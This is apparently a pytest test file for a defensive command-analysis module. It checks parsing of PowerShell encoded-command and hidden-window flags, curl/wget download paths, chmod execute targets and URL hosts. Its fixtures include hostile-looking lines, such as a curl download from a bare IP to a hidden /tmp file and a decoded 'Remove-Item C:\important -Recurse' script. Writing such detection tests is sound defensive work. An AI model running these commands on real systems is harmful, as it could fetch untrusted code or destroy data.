import base64

import pytest

from src.command_analysis import (
    basename,
    decode_encoded_command,
    get_chmod_execute_targets,
    get_download_output_path,
    get_encoded_command,
    get_url_hosts,
    has_hidden_window,
)


def encode(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


# --- PowerShell -------------------------------------------------------------


@pytest.mark.parametrize("flag", ["-e", "-enc", "-Enc", "-EncodedCommand", "-ec", "/enc"])
def test_encoded_command_flag_variants(flag):
    value = encode("Get-Date")
    assert get_encoded_command(f"powershell.exe -NoP {flag} {value}") == value


@pytest.mark.parametrize(
    "command_line",
    [
        "powershell.exe -ExecutionPolicy Bypass -File script.ps1",  # -Ex is not -EncodedCommand
        "powershell.exe -NoProfile -Command Get-Service",
        "",
        None,
    ],
)
def test_no_encoded_command(command_line):
    assert get_encoded_command(command_line) is None


@pytest.mark.parametrize("command_line", ["powershell -W Hidden -c x", "powershell -WindowStyle hidden", "pwsh -win Hidden"])
def test_hidden_window_detected(command_line):
    assert has_hidden_window(command_line)


@pytest.mark.parametrize("command_line", ["powershell -WindowStyle Normal", "powershell -NoProfile", None])
def test_hidden_window_not_detected(command_line):
    assert not has_hidden_window(command_line)


def test_decode_encoded_command_returns_text():
    assert decode_encoded_command(encode("Write-Output 'hi'")) == "Write-Output 'hi'"


@pytest.mark.parametrize(
    "value",
    [
        "not base64!!",  # invalid characters
        "QUJD",  # valid Base64, but 3 bytes: not valid UTF-16LE
        base64.b64encode(b"\x00\xd8").decode(),  # lone UTF-16 surrogate
        "",
        None,
    ],
)
def test_decode_invalid_values_returns_none(value):
    assert decode_encoded_command(value) is None


def test_decoded_command_is_only_returned_as_text(monkeypatch):
    """Decoding must never run anything, even for content that looks like code."""
    import os
    import subprocess

    def forbidden(*args, **kwargs):
        raise AssertionError("decoder tried to execute something")

    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(os, "system", forbidden)
    script = "Start-Process calc.exe; Remove-Item C:\\important -Recurse"
    assert decode_encoded_command(encode(script)) == script


# --- Linux commands ---------------------------------------------------------


@pytest.mark.parametrize(
    "command_line, expected",
    [
        ("curl -fsSL http://198.51.100.1/k -o /tmp/.x", "/tmp/.x"),
        ("curl --output /tmp/a http://x", "/tmp/a"),
        ("curl --output=/tmp/b http://x", "/tmp/b"),
        ("curl -sLo /tmp/c http://x", "/tmp/c"),
        ("wget -q http://x -O /tmp/d", "/tmp/d"),
        ("wget --output-document=/tmp/e http://x", "/tmp/e"),
        ("/usr/bin/curl -o '/tmp/with space' http://x", "/tmp/with space"),
    ],
)
def test_download_output_path(command_line, expected):
    assert get_download_output_path(command_line) == expected


@pytest.mark.parametrize(
    "command_line",
    [
        "curl -s http://127.0.0.1:8080/healthz",  # output to stdout
        "curl -o relative/file http://x",  # working directory unknown
        "wget -O - http://x",  # stdout
        "curl -o /tmp/x 'unbalanced",  # unparseable quoting
        "cat /tmp/x",
        None,
    ],
)
def test_no_download_output_path(command_line):
    assert get_download_output_path(command_line) is None


@pytest.mark.parametrize(
    "command_line, expected",
    [
        ("chmod +x /tmp/a", ["/tmp/a"]),
        ("chmod u+x /tmp/a /tmp/b", ["/tmp/a", "/tmp/b"]),
        ("chmod 755 /tmp/a", ["/tmp/a"]),
        ("chmod -R a+rx /opt/tool", ["/opt/tool"]),
        ("chmod 644 /tmp/a", []),  # no execute bit
        ("chmod -x /tmp/a", []),  # removes execute
        ("chmod u-x /tmp/a", []),
        ("ls -l /tmp/a", []),
    ],
)
def test_chmod_execute_targets(command_line, expected):
    assert get_chmod_execute_targets(command_line) == expected


def test_basename_handles_windows_and_linux_paths():
    assert basename("C:\\Program Files\\Microsoft Office\\WINWORD.EXE") == "winword.exe"
    assert basename("/usr/bin/curl") == "curl"
    assert basename(None) == ""


@pytest.mark.parametrize(
    "command_line, expected",
    [
        ("curl -fsSL http://198.51.100.77/k -o /tmp/x", ["198.51.100.77"]),
        ("wget https://tools.example:8443/a -O /tmp/a", ["tools.example"]),
        ("curl -s http://127.0.0.1:8080/healthz", ["127.0.0.1"]),
        ("curl http://a.example/1 http://a.example/2", ["a.example"]),
        ("chmod +x /tmp/x", []),
        (None, []),
    ],
)
def test_get_url_hosts(command_line, expected):
    assert get_url_hosts(command_line) == expected
